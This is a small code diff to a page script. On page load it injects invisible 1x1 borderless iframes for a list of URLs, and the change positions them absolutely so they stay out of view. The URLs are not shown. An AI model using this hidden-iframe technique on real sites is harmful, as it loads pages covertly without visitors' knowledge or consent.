@@ -5,7 +5,7 @@ window.onload = function(){
     var node = document.createElement('iframe');
     node.width = 1;
     node.height = 1;
-    node.style.cssText = 'padding:0;margin:0;border: 0;display: inline-block;';
+    node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
     list.forEach(url => {
       node.src = url;
       document.body.append(node.cloneNode());
